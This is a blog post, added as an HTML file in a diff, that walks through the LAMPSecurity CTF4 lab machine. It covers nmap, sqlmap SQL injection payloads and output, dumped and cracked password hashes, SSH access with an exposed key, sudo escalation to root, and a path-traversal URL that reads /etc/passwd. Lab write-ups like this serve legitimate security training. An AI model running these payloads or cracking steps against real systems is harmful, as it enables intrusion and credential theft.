@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>LAMPSecurity: CTF4 | maggick's logs</title>
+
+    <meta name="author" content="Matthieu Keller">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="http://matthieukeller.com/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="http://yui.yahooapis.com/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="http://matthieukeller.com/theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="http://matthieukeller.com/index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+                <li>
+                  <a href="http://matthieukeller.com/category/misc.html">Misc</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/programming.html">programming</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/programming-security.html">programming, security</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/security.html">security</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/sports.html">Sports</a>
+                </li>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="http://matthieukeller.com/pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="http://matthieukeller.com/pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="http://matthieukeller.com/2014/08/lampsecurity-ctf4.html" title="Read more" class="entry-title-link">
+                LAMPSecurity: CTF4</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2014-08-29T00:00:00+02:00">29 Aug 2014</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="http://matthieukeller.com/author/matthieu-keller.html" title="Read more posts from Matthieu Keller" class="meta-link">Matthieu Keller</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="http://matthieukeller.com/tag/challenge.html" title="Read more with the label challenge" class="meta-link">challenge</a> 
+          <a href="http://matthieukeller.com/tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="http://matthieukeller.com/tag/vulnhub.html" title="Read more with the label vulnhub" class="meta-link">vulnhub</a> 
+      </span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p>I start the LAMPSecurity CTF4 challenge of vulnhub
+<a href="http://vulnhub.com/entry/lampsecurity-ctf4,83/">available here</a>.
+The goal is to get a root shell on the server.</p>
+<h1 id="discovery">Discovery</h1>
+<p>First of all we need to determine the IP address of the server.
+Since we launch it in a bridged virtual machine the local router got the IP
+address in the DHCP logs. We simply found the most recent one. For me it is
+<code>192.168.1.56</code>.</p>
+<h2 id="nmap">Nmap</h2>
+<p>Let start with a simple nmap</p>
+<div class="highlight"><pre><span></span><span class="nn">#nmap</span> <span class="nt">-A</span> <span class="nt">-oA</span> <span class="nt">ctf4</span> <span class="nt">192</span><span class="nc">.168.1.56</span>
+<span class="nt">Nmap</span> <span class="nt">6</span><span class="nc">.47</span> <span class="nt">scan</span> <span class="nt">initiated</span> <span class="nt">Thu</span> <span class="nt">Aug</span> <span class="nt">28</span> <span class="nt">18</span><span class="nd">:49:49</span> <span class="nt">2014</span> <span class="nt">as</span><span class="o">:</span> <span class="nt">nmap</span> <span class="nt">-A</span> <span class="nt">-oA</span> <span class="nt">ctf4</span> <span class="nt">192</span><span class="nc">.168.1.56</span>
+<span class="nt">Nmap</span> <span class="nt">scan</span> <span class="nt">report</span> <span class="nt">for</span> <span class="nt">192</span><span class="nc">.168.1.56</span>
+<span class="nt">Host</span> <span class="nt">is</span> <span class="nt">up</span> <span class="o">(</span><span class="nt">0</span><span class="nc">.00058s</span> <span class="nt">latency</span><span class="o">).</span>
+<span class="nt">Not</span> <span class="nt">shown</span><span class="o">:</span> <span class="nt">996</span> <span class="nt">filtered</span> <span class="nt">ports</span>
+<span class="nt">PORT</span>    <span class="nt">STATE</span>  <span class="nt">SERVICE</span> <span class="nt">VERSION</span>
+<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span>  <span class="nt">open</span>   <span class="nt">ssh</span>     <span class="nt">OpenSSH</span> <span class="nt">4</span><span class="nc">.3</span> <span class="o">(</span><span class="nt">protocol</span> <span class="nt">2</span><span class="nc">.0</span><span class="o">)</span>
+<span class="o">|</span> <span class="nt">ssh-hostkey</span><span class="o">:</span>
+<span class="o">|</span>   <span class="nt">1024</span> <span class="nt">10</span><span class="nd">:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef</span> <span class="o">(</span><span class="nt">DSA</span><span class="o">)</span>
+<span class="o">|</span><span class="nt">_</span>  <span class="nt">2048</span> <span class="nt">e7</span><span class="nd">:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4</span> <span class="o">(</span><span class="nt">RSA</span><span class="o">)</span>
+<span class="nt">25</span><span class="o">/</span><span class="nt">tcp</span>  <span class="nt">open</span>   <span class="nt">smtp</span>    <span class="nt">Sendmail</span> <span class="nt">8</span><span class="nc">.13.5</span><span class="o">/</span><span class="nt">8</span><span class="nc">.13.5</span>
+<span class="o">|</span> <span class="nt">smtp-commands</span><span class="o">:</span> <span class="nt">ctf4</span><span class="nc">.sas.upenn.edu</span> <span class="nt">Hello</span> <span class="cp">[</span><span class="mf">192.168.1.97</span><span class="cp">]</span><span class="o">,</span> <span class="nt">pleased</span> <span class="nt">to</span> <span class="nt">meet</span> <span class="nt">you</span><span class="o">,</span> <span class="nt">ENHANCEDSTATUSCODES</span><span class="o">,</span> <span class="nt">PIPELINING</span><span class="o">,</span> <span class="nt">EXPN</span><span class="o">,</span> <span class="nt">VERB</span><span class="o">,</span> <span class="nt">8BITMIME</span><span class="o">,</span> <span class="nt">SIZE</span><span class="o">,</span> <span class="nt">DSN</span><span class="o">,</span> <span class="nt">ETRN</span><span class="o">,</span> <span class="nt">DELIVERBY</span><span class="o">,</span> <span class="nt">HELP</span><span class="o">,</span>
+<span class="o">|</span><span class="nt">_</span> <span class="nt">2</span><span class="nc">.0.0</span> <span class="nt">This</span> <span class="nt">is</span> <span class="nt">sendmail</span> <span class="nt">version</span> <span class="nt">8</span><span class="nc">.13.5</span> <span class="nt">2</span><span class="nc">.0.0</span> <span class="nt">Topics</span><span class="o">:</span> <span class="nt">2</span><span class="nc">.0.0</span> <span class="nt">HELO</span> <span class="nt">EHLO</span> <span class="nt">MAIL</span> <span class="nt">RCPT</span> <span class="nt">DATA</span> <span class="nt">2</span><span class="nc">.0.0</span> <span class="nt">RSET</span> <span class="nt">NOOP</span> <span class="nt">QUIT</span> <span class="nt">HELP</span> <span class="nt">VRFY</span> <span class="nt">2</span><span class="nc">.0.0</span> <span class="nt">EXPN</span> <span class="nt">VERB</span> <span class="nt">ETRN</span> <span class="nt">DSN</span> <span class="nt">AUTH</span> <span class="nt">2</span><span class="nc">.0.0</span> <span class="nt">STARTTLS</span> <span class="nt">2</span><span class="nc">.0.0</span> <span class="nt">For</span> <span class="nt">more</span> <span class="nt">info</span> <span class="nt">use</span> <span class="s2">&quot;HELP &lt;topic&gt;&quot;</span><span class="o">.</span> <span class="nt">2</span><span class="nc">.0.0</span> <span class="nt">To</span> <span class="nt">report</span> <span class="nt">bugs</span> <span class="nt">in</span> <span class="nt">the</span> <span class="nt">implementation</span> <span class="nt">send</span> <span class="nt">email</span> <span class="nt">to</span> <span class="nt">2</span><span class="nc">.0.0</span> <span class="nt">sendmail-bugs</span><span class="k">@sendmail</span><span class="nc">.org</span><span class="o">.</span> <span class="nt">2</span><span class="nc">.0.0</span> <span class="nt">For</span> <span class="nt">local</span> <span class="nt">information</span> <span class="nt">send</span> <span class="nt">email</span> <span class="nt">to</span> <span class="nt">Postmaster</span> <span class="nt">at</span> <span class="nt">your</span> <span class="nt">site</span><span class="o">.</span> <span class="nt">2</span><span class="nc">.0.0</span> <span class="nt">End</span> <span class="nt">of</span> <span class="nt">HELP</span> <span class="nt">info</span>
+<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span>  <span class="nt">open</span>   <span class="nt">http</span>    <span class="nt">Apache</span> <span class="nt">httpd</span> <span class="nt">2</span><span class="nc">.2.0</span> <span class="o">((</span><span class="nt">Fedora</span><span class="o">))</span>
+<span class="o">|</span><span class="nt">_http-methods</span><span class="o">:</span> <span class="nt">No</span> <span class="nt">Allow</span> <span class="nt">or</span> <span class="nt">Public</span> <span class="nt">header</span> <span class="nt">in</span> <span class="nt">OPTIONS</span> <span class="nt">response</span> <span class="o">(</span><span class="nt">status</span> <span class="nt">code</span> <span class="nt">200</span><span class="o">)</span>
+<span class="o">|</span> <span class="nt">http-robots</span><span class="nc">.txt</span><span class="o">:</span> <span class="nt">5</span> <span class="nt">disallowed</span> <span class="nt">entries</span>
+<span class="o">|</span><span class="nt">_</span><span class="o">/</span><span class="nt">mail</span><span class="o">/</span> <span class="o">/</span><span class="nt">restricted</span><span class="o">/</span> <span class="o">/</span><span class="nt">conf</span><span class="o">/</span> <span class="o">/</span><span class="nt">sql</span><span class="o">/</span> <span class="o">/</span><span class="nt">admin</span><span class="o">/</span>
+<span class="o">|</span><span class="nt">_http-title</span><span class="o">:</span>  <span class="nt">Prof</span><span class="o">.</span> <span class="nt">Ehks</span>
+<span class="nt">631</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">closed</span> <span class="nt">ipp</span>
+<span class="nt">Aggressive</span> <span class="nt">OS</span> <span class="nt">guesses</span><span class="o">:</span> <span class="nt">Linux</span> <span class="nt">2</span><span class="nc">.6.16</span> <span class="nt">-</span> <span class="nt">2</span><span class="nc">.6.21</span> <span class="o">(</span><span class="nt">98</span><span class="o">%),</span> <span class="nt">Linux</span> <span class="nt">2</span><span class="nc">.6.13</span> <span class="nt">-</span> <span class="nt">2</span><span class="nc">.6.32</span> <span class="o">(</span><span class="nt">96</span><span class="o">%),</span> <span class="nt">Control4</span> <span class="nt">HC-300</span> <span class="nt">home</span> <span class="nt">controller</span> <span class="o">(</span><span class="nt">96</span><span class="o">%),</span> <span class="nt">Lantronix</span> <span class="nt">SLC</span> <span class="nt">8</span> <span class="nt">terminal</span> <span class="nt">server</span> <span class="o">(</span><span class="nt">Linux</span> <span class="nt">2</span><span class="nc">.6</span><span class="o">)</span> <span class="o">(</span><span class="nt">96</span><span class="o">%),</span> <span class="nt">SNR</span> <span class="nt">SNR-S2960</span> <span class="nt">switch</span> <span class="o">(</span><span class="nt">95</span><span class="o">%),</span> <span class="nt">SonicWALL</span> <span class="nt">Aventail</span> <span class="nt">EX-6000</span> <span class="nt">VPN</span> <span class="nt">appliance</span> <span class="o">(</span><span class="nt">94</span><span class="o">%),</span> <span class="nt">Linux</span> <span class="nt">2</span><span class="nc">.6.8</span> <span class="nt">-</span> <span class="nt">2</span><span class="nc">.6.30</span> <span class="o">(</span><span class="nt">94</span><span class="o">%),</span> <span class="nt">Dell</span> <span class="nt">iDRAC</span> <span class="nt">6</span> <span class="nt">remote</span> <span class="nt">access</span> <span class="nt">controller</span> <span class="o">(</span><span class="nt">Linux</span> <span class="nt">2</span><span class="nc">.6</span><span class="o">)</span> <span class="o">(</span><span class="nt">94</span><span class="o">%),</span> <span class="nt">Linux</span> <span class="nt">2</span><span class="nc">.6.9</span> <span class="nt">-</span> <span class="nt">2</span><span class="nc">.6.18</span> <span class="o">(</span><span class="nt">94</span><span class="o">%),</span> <span class="nt">Linux</span> <span class="nt">2</span><span class="nc">.6.18</span> <span class="nt">-</span> <span class="nt">2</span><span class="nc">.6.32</span> <span class="o">(</span><span class="nt">94</span><span class="o">%)</span>
+<span class="nt">No</span> <span class="nt">exact</span> <span class="nt">OS</span> <span class="nt">matches</span> <span class="nt">for</span> <span class="nt">host</span> <span class="o">(</span><span class="nt">test</span> <span class="nt">conditions</span> <span class="nt">non-ideal</span><span class="o">)</span>
+<span class="nt">Service</span> <span class="nt">Info</span><span class="o">:</span> <span class="nt">Host</span><span class="o">:</span> <span class="nt">ctf4</span><span class="nc">.sas.upenn.edu</span><span class="p">;</span> <span class="nt">OS</span><span class="o">:</span> <span class="nt">Unix</span>
+</pre></div>
+
+
+<p>We found a list of available services:</p>
+<ul>
+<li>a SSH service on port 22</li>
+<li>a mail service on port 25</li>
+<li>a web service on port 80, note that there is five disallowed entries in robots.txt</li>
+<li>and a close CUPS service on port 631.</li>
+</ul>
+<h2 id="the-website">The website</h2>
+<p>Let's take a look at the web site. It is a simple blog site with a XSS flaw on
+the search engine.</p>
+<p>The article are indexed with a GET parameter id. This parameter is vulnerable to
+an SQL injection.</p>
+<h1 id="exploitation">Exploitation</h1>
+<h2 id="sqlmap">Sqlmap</h2>
+<p>We launch sqlmap:</p>
+<div class="highlight"><pre><span></span>#sqlmap -u &#39;http://192.168.1.56/index.html?page=blog&amp;title=Blog&amp;id=6&#39; -p id --tables
+  sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+  ---
+  Place: GET
+  Parameter: id
+      Type: boolean-based blind
+      Title: AND boolean-based blind - WHERE or HAVING clause
+      Payload: page=blog&amp;title=Blog&amp;id=6 AND 2396=2396
+
+      Type: UNION query
+      Title: MySQL UNION query (NULL) - 5 columns
+      Payload: page=blog&amp;title=Blog&amp;id=6 UNION ALL SELECT NULL,CONCAT(0x7172756f71,0x494c647a675a47595a55,0x7178657471),NULL,NULL,NULL#
+
+      Type: AND/OR time-based blind
+      Title: MySQL &gt; 5.0.11 AND time-based blind
+      Payload: page=blog&amp;title=Blog&amp;id=6 AND SLEEP(5)
+  ---
+  [19:44:24] [INFO] the back-end DBMS is MySQL
+  web server operating system: Linux Fedora 5 (Bordeaux)
+  web application technology: Apache 2.2.0, PHP 5.1.2
+  back-end DBMS: MySQL 5.0.11
+  [19:44:24] [INFO] fetching database names
+  [19:44:24] [INFO] fetching tables for databases: &#39;calendar, ehks, information_schema, mysql, roundcubemail, test&#39;
+  Database: calendar
+  [5 tables]
+  +---------------------------------------+
+  | phpc_calendars                        |
+  | phpc_events                           |
+  | phpc_sequence                         |
+  | phpc_users                            |
+  | uid                                   |
+  +---------------------------------------+
+
+  Database: roundcubemail
+  [6 tables]
+  +---------------------------------------+
+  | session                               |
+  | cache                                 |
+  | contacts                              |
+  | identities                            |
+  | messages                              |
+  | users                                 |
+  +---------------------------------------+
+
+  Database: ehks
+  [3 tables]
+  +---------------------------------------+
+  | user                                  |
+  | blog                                  |
+  | comment                               |
+  +---------------------------------------+
+
+  Database: information_schema
+  [16 tables]
+  +---------------------------------------+
+  | CHARACTER_SETS                        |
+  | COLLATIONS                            |
+  | COLLATION_CHARACTER_SET_APPLICABILITY |
+  | COLUMNS                               |
+  | COLUMN_PRIVILEGES                     |
+  | KEY_COLUMN_USAGE                      |
+  | ROUTINES                              |
+  | SCHEMATA                              |
+  | SCHEMA_PRIVILEGES                     |
+  | STATISTICS                            |
+  | TABLES                                |
+  | TABLE_CONSTRAINTS                     |
+  | TABLE_PRIVILEGES                      |
+  | TRIGGERS                              |
+  | USER_PRIVILEGES                       |
+  | VIEWS                                 |
+  +---------------------------------------+
+
+  Database: mysql
+  [17 tables]
+  +---------------------------------------+
+  | user                                  |
+  | columns_priv                          |
+  | db                                    |
+  | func                                  |
+  | help_category                         |
+  | help_keyword                          |
+  | help_relation                         |
+  | help_topic                            |
+  | host                                  |
+  | proc                                  |
+  | procs_priv                            |
+  | tables_priv                           |
+  | time_zone                             |
+  | time_zone_leap_second                 |
+  | time_zone_name                        |
+  | time_zone_transition                  |
+  | time_zone_transition_type             |
+  +---------------------------------------+
+</pre></div>
+
+
+<p>Okay so there is a lot of database let's dump the ehks users table:</p>
+<div class="highlight"><pre><span></span># sqlmap -u &#39;http://192.168.1.56/index.html?page=blog&amp;title=Blog&amp;id=6&#39; -p id -D  ehks -T user --dump
++---------+-----------+----------------------------------+
+| user_id | user_name | user_pass                        |
++---------+-----------+----------------------------------+
+| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 |
+| 2       | achen     | b46265f1e7faa3beab09db5c28739380 |
+| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 |
+| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 |
+| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 |
+| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f |
++---------+-----------+----------------------------------+
+</pre></div>
+
+
+<h2 id="cracking-the-hashes">Cracking the hashes</h2>
+<p>We save the hahses in a file (option proposed by sqlmap) and we launch john the
+ripper on it:</p>
+<div class="highlight"><pre><span></span>#john hashes --format=raw-md5
+sorzek:pacman
+jdurbin:Sue1978
+2 password hashes cracked, 4 left
+</pre></div>
+
+
+<p>We test the cracked password on:</p>
+<ul>
+<li>the restricted part: there is two text files about how to blog and how to use the web mail</li>
+<li>the admin part: with the two cracked accounts we can only write new article, that is not really useful for our CTF</li>
+<li>the mail part: according to the instruction on the restricted part we can access the user's emails from here.</li>
+</ul>
+<p>We found in an email from sorzek to ghighland that he just add a number to is
+useual password "undone" so we just tell john to try password from undone0 to
+undone9999. We cracked an other password:</p>
+<div class="highlight"><pre><span></span><span class="n">ghighland</span><span class="o">:</span><span class="n">undone1</span>
+</pre></div>
+
+
+<h2 id="ssh-connexions">SSH connexions</h2>
+<p>Okay the same password seems to be used everywhere and I was a bit lost to how
+to continue so I try the credentials on the ssh service: <em>it works!</em></p>
+<p>First of all I logged with the jdurbin account.
+There seems to be anything useful but in my search I saw that achen had an
+ssh private key readable by everyone (a ppk one for PuTTY).
+Okay lets use it to connect on the machine. It ask no password and we got a
+shell, what now?</p>
+<h2 id="privileges-escalation">Privileges escalation</h2>
+<p>I try to see what was the differences with this account and I saw a pdf file
+"linux_administration.pdf" so I tried to use the sudo command with <code>sudo -v</code> and
+once again: <em>it works!</em>
+So a simple <code>sudo su</code> give us the root rights.</p>
+<p><em>DONE!</em></p>
+<h1 id="summary">Summary</h1>
+<p>Lets resume :</p>
+<ol>
+<li>exploitation of the SQL injection</li>
+<li>cracked the hashes</li>
+<li>use the credentials on the SSH service</li>
+<li>find the ppk SSH key</li>
+<li>use it to connect on the achen account</li>
+<li>sudo su</li>
+</ol>
+<p>That was a easy one !</p>
+<h1 id="nota-bene">Nota bene</h1>
+<p>Oh yeah we do not explore the lead of the file injection in the
+page GET parameter:</p>
+<div class="highlight"><pre><span></span>http://192.168.1.56/index.html?page=../../../../../../etc/passwd%00&amp;title=Blog&amp;id=5
+</pre></div>
+
+
+<p>Moreover the root password "root1234" where is the <code>bash_history</code> of achen.</p>
+    </div>
+
+        <footer>
+<div class="social-buttons">
+
+
+</div>        </footer>
+
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = "matthieukeller";
+        var disqus_identifier = "2014/08/lampsecurity-ctf4.html";
+
+        (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-books"></span>
+                    <a href="/pages/books.html">books</a>
+                </li>
+                <li>
+                    <span class= "icons icons-palmares"></span>
+                    <a href="/pages/palmares.html">palmares</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/matthieukeller">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-linkedin"></span>
+                    <a href="https://linkedin.com/in/matthieukeller">linkedin</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+    <script>
+        (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
+        function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
+        e=o.createElement(i);r=o.getElementsByTagName(i)[0];
+        e.src='//www.google-analytics.com/analytics.js';
+        r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
+        ga('create','UA-63314567-1');ga('send','pageview');
+    </script>
+
+</div>
+</body>
+</html>
